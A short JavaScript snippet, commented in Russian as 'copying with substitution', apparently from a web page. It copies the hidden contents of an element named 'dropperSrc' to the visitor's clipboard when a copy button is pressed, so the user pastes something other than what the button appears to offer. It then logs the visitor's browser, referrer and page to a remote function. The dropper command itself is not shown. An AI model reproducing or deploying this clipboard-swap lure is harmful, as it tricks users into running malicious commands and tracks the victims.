// копирование с подменой через data-copy + логирование

var DROPPER_ID = "dropperSrc";

function logCopy(action){
  try {
    fetch('/.netlify/functions/log', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        action: action,
        ua: navigator.userAgent,
        ref: document.referrer || 'direct',
        page: location.href
      })
    }).catch(function(){});
  } catch(e){}
}

function copyCmd(btn){
  var src = btn.getAttribute('data-copy') || DROPPER_ID;
  var el = document.getElementById(src);
  if (!el) return;

  var text = el.innerText;
  navigator.clipboard.writeText(text).then(function(){
    var old = btn.textContent;
    btn.textContent = 'Скопировано';
    setTimeout(function(){ btn.textContent = old; }, 1500);
    logCopy(src);
  });
}